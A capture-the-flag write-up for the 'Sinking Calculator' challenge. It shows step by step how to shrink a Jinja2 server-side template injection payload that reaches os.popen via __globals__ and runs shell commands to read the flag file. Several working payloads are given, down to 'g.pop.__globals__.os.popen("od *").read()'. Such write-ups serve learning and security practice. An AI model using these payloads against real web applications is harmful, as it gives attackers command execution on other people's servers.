# Sinking Calculator | Points: 300 | Solves: 86

My computer architecture professor told me: "Every time you see a decimal, you should hate it!" I took his advice to heart, and made a calculator. But don't worry! I got rid of all the decimals. No floats here!

Flag is in the file flag.

Attachments:
- https://imaginaryctf.org/r/40A3-app.py
- https://sinking-calculator.chal.imaginaryctf.org

#

We are presented with an input field where we can input our calculations. The code performing these calculations looks like this:

```python
@app.route('/calc')
def calc():
    query = request.args['query']
    request.args = {}
    request.headers = {} # no outside help!
    request.cookies = {}
    if len(query) > 80: # my exploit is 77 chars, but 80 is such a nice even number
        return "Too long!"
    res = render_template_string("{{%s}}"%query)
    out = ''
    for c in res:
        if c in "0123456789-": # negative numbers are cool
            out += c
    return out
```

We can see the actual calculations happen in this line of code:

```python
res = render_template_string("{{%s}}"%query)
```

This is a big indicator that the solution lies in exploiting the rendering of this template but there are 2 roadblocks. Firstly the length of our exploit can be at most 80 and secondly only the digits of whatever our exploit returns will be displayed. The objective is to read the contents of the file "flag" so we will need to convert its contents to digits somehow. Lets deal with how to read the file first. 

I'm not going to go into too much detail of how these exploits work. Instead I will focus on the steps I took to reduce the characters required, well below the limit of 80 characters. This was the first challenge of this kind I had worked on so hopefully I can capture the ideas and strategies I used to learn these techniques for the first time, including some links I used in the process. 

My initial exploit looked like this:

```python
request["application"]["__globals__"]["__builtins__"]["__import__"]('os')["popen"]("cat flag | xxd -b")["read"]()
```

What a mess! This script accesses the function ```popen``` to gain shell access to read the flag via cat and then pipe the output to ```xxd```. With the ```-b``` option ```xxd``` will print the content of the file in binary, passing the numeric requirement mentioned earlier. But this is 113 characters long, no good. An obvious optimization is to use dot notation instead of indexing via strings, like this:

```python
request.application.__globals__.__builtins__.__import__("os").popen("cat flag | xxd -b").read()
```

A little better, 95 characters. At this point I felt like investigating another approach by using ```mro()``` and similar tricks. I came up with this:

```python
request.__class__.mro()[3].__subclasses__()[84].load_module("os").popen("cat flag | xxd -b").read()
```

At 99 characters it is actually worse than the previous exploit but I'm including it to show the process I went through. It was a path worth investigating, it just didn't pan out. Now I started playing around with different attributes that lead to accessing ```__builtins__``` and I found that ```self.__init__``` can be used instead of ```request.application``` which gets us down to 89 characters with the exploit below. So close! 

```python
self.__init__.__globals__.__builtins__.__import__("os").popen("cat flag | xxd -b").read()
```

I felt a little stuck at this point with the process of finding shorter paths to the ```os``` module so I played a bit with the command to read the flag and found two neat little tricks. There is a command similar to cat that also prints line numbers called ```nl```, one character shorter than ```cat```. We can also use "*" instead of specifically reading just the file "flag", saving us 3 characters. 

```python
self.__init__.__globals__.__builtins__.__import__("os").popen("nl * | xxd -b").read()
````

Only 5 characters more to go! To cut off the last few characters I remembered that the ```os``` module can sometimes be accessed directly via the attribute ```__globals__```. Indeed if we use ```config.__class__.__init__.__globals__``` we can directly access the ```os``` module! We have our finished exploit! This trick in fact saves us so many characters that we can skip the last two tricks and still get away with it! 

```python
config.__class__.__init__.__globals__.os.popen('cat flag | xxd -b').read()
```

74 characters! We paste it into the input field and... no flag :(. Why? Well the assumption this exploit relies on is that ```xxd``` is installed, which is not the case on the challenge server. Is all hope lost? No. After googling a bit for alternatives to ```xxd``` I found this helpful Stackoverflow post https://stackoverflow.com/questions/1765311/how-to-view-files-in-binary-from-bash mentioning ```od```. With the command ```od -b``` we convert the contents to octal, that is base 8 (It's also conveniently one character shorter than ```xxd```). We will have to do some post processing though because od produces 7 character long line numbers which we have to filter out to read the actual flag, but that is easy enough to automate. Turns out we can also skip accessing the attribute ```__class__``` and go directly to ```__init__```. The working exploit, all tricks included, is the following 59 character exploit. 

```python
config.__init__.__globals__.os.popen('nl * | od -b').read()
```

Pasting this into the input field gets us the flag: ictf{this_flag_has_three_interesting_properties_it_has_no_numbers_or_dashes_it_is_quite_long_and_it_is_quite_scary}

Can we do any better though length wise? Quite a lot actually! Firstly I completedy missed the fact that od displays the content in base 8 by default, no need for the ```-b``` option (Looking back I really don't know how this happened, I guess I just assumed these sorts of tools usually use hex by default). Another obvious thing to do is to just call ```od *``` instead of piping the output from ```nl``` or ```cat``` (Again I don't understand how I missed this). I also briefly talked to one of the organizers after the CTF who pointed out that instead of using ```config.__init__``` we can use ```g.pop```. I haven't confirmed this myself except that locally I can't access the ```os``` module through this method. This might be different from program to program or system to system, as seems to be the case regarding which modules can be accessed via ```__globals__``` and more specifically which object ```__globals__``` is accessed via. In any case, assuming the organizer I talked with was correct, the following is the shortest exloit so far. 

```python
g.pop.__globals__.os.popen("od *").read()
```

In the end we got down to 41 characters, almost half of the limit! More importantly we leave with a bunch of cool tricks to apply in future challenges of this kind, even ones with a tighter character limit. 
